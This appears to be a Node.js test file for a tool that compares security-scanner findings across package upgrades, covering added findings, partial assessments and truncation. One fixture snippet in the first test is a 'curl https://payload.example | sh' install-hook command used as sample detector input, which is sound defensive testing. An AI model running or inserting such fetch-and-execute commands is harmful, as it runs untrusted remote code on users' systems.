"use strict";

const assert = require("node:assert/strict");
const test = require("node:test");
const { compareUpgradeFindings } = require("../src/upgrade-diff");
const { run } = require("../benchmark/upgrade-diff");

const finding = { category: "install-hook", severity: "medium", file: "package.json", snippet: "node setup.js", line: 3 };
function outcome(findings, patch = {}) {
  return { verdict: "review", report: { findings }, assessment: {
    engine: { buildId: "engine-a" }, policySha256: "policy-a",
    authorization: { behavioralCoverage: "completed", mandatoryHoldReasons: [], explicitOverride: false },
    checks: { source: "completed", vulnerabilities: "completed", directDependencies: "not-requested" },
    ...patch
  } };
}

test("a new cited finding is surfaced even when both verdicts stay REVIEW", () => {
  const before = outcome([finding]);
  const after = outcome([finding, { ...finding, snippet: "curl https://payload.example | sh" }]);
  const result = compareUpgradeFindings(before, after);
  assert.equal(result.status, "compared");
  assert.deepEqual(result.counts, { added: 1, notObserved: 0 });
  assert.equal(result.added[0].category, "install-hook");
  assert.match(result.added[0].fingerprint, /^[a-f0-9]{64}$/);
  assert.equal(JSON.stringify(result).includes("curl"), false, "source snippets are not copied into the compact comparison");
  assert.equal(before.report.findings.length, 1, "comparison does not mutate reports");
});

test("line movement, rationale edits and finding order do not invent changes", () => {
  const other = { ...finding, file: "other.json" };
  const result = compareUpgradeFindings(outcome([finding, other]), outcome([{ ...other, line: 99 }, { ...finding, rationale: "new explanation" }]));
  assert.deepEqual(result.counts, { added: 0, notObserved: 0 });
});

test("severity changes, different cited bytes and duplicate instances remain visible", () => {
  for (const changed of [{ ...finding, severity: "high" }, { ...finding, snippet: "node other.js" }]) {
    const result = compareUpgradeFindings(outcome([finding]), outcome([changed]));
    assert.deepEqual(result.counts, { added: 1, notObserved: 1 });
  }
  assert.deepEqual(compareUpgradeFindings(outcome([finding]), outcome([finding, finding])).counts, { added: 1, notObserved: 0 });
});

test("incomplete, unmatched or missing assessment context cannot claim disappearance", () => {
  const variants = [
    {},
    { engine: { buildId: "engine-b" } },
    { policySha256: "policy-b" },
    { checks: { source: "partial", vulnerabilities: "completed" } },
    { checks: { source: "completed", vulnerabilities: "disabled" } },
    { checks: { source: "completed", vulnerabilities: "completed", directDependencies: "partial" } },
    { checks: { source: "completed", vulnerabilities: "completed", directDependencies: "completed" } }
  ];
  for (const patch of variants) {
    const candidate = Object.keys(patch).length ? outcome([], patch) : { report: { findings: [] } };
    const delta = compareUpgradeFindings(outcome([finding]), candidate);
    assert.equal(delta.status, "partial");
    assert.equal(delta.notObserved, null);
    assert.equal(delta.counts.notObserved, null);
  }
});

test("partial baseline still yields new observations, without claiming removed risk", () => {
  const result = compareUpgradeFindings(outcome([finding], { checks: {} }), outcome([{ ...finding, file: "new.js" }]));
  assert.equal(result.status, "partial");
  assert.equal(result.counts.added, 1);
  assert.equal(result.notObserved, null);
});

test("behavioral coverage and mandatory holds cannot be hidden by completed source/CVE checks", () => {
  const variants = [undefined, {},
    { behavioralCoverage: "partial", mandatoryHoldReasons: [] },
    { behavioralCoverage: "completed", mandatoryHoldReasons: ["unsupported-behavior"] },
    { behavioralCoverage: "partial", mandatoryHoldReasons: ["flow-analysis-gap"], explicitOverride: true }];
  for (const authorization of variants) {
    for (const side of ["baseline", "candidate"]) {
      const baseline = outcome([finding], side === "baseline" ? { authorization } : {});
      const candidate = outcome([], side === "candidate" ? { authorization } : {});
      const result = compareUpgradeFindings(baseline, candidate);
      assert.equal(result.status, "partial");
      assert.equal(result.notObserved, null);
      assert.equal(result.counts.notObserved, null);
    }
  }
});

test("missing and malformed finding arrays remain unavailable, not empty", () => {
  for (const report of [null, {}, { findings: null }, { findings: [null] }, { findings: [{ ...finding, snippet: undefined }] },
    { findings: [{ ...finding, snippet: "x".repeat(16385) }] }, { findings: Array(2001).fill(finding) }]) {
    const result = compareUpgradeFindings(outcome([finding]), { report });
    assert.equal(result.status, "unavailable");
    assert.equal(result.notObserved, null);
  }
});

test("finding detail caps retain totals and declare truncation", () => {
  const findings = Array.from({ length: 70 }, (_, n) => ({ ...finding, file: `file-${n}.js` }));
  const result = compareUpgradeFindings(outcome([]), outcome(findings));
  assert.equal(result.added.length, 50);
  assert.equal(result.counts.added, 70);
  assert.equal(result.truncated, true);
});

test("authored upgrade calibration gates real scanner findings and benign lookalikes", () => {
  const result = run();
  assert.ok(result.total >= 10);
  assert.equal(result.passed, result.total, JSON.stringify(result.results.filter(item => !item.passed)));
  assert.equal(result.missedAddedSignals, 0);
  assert.equal(result.unexpectedAddedSignals, 0);
  assert.match(result.labelSource, /not independently labelled/);
});
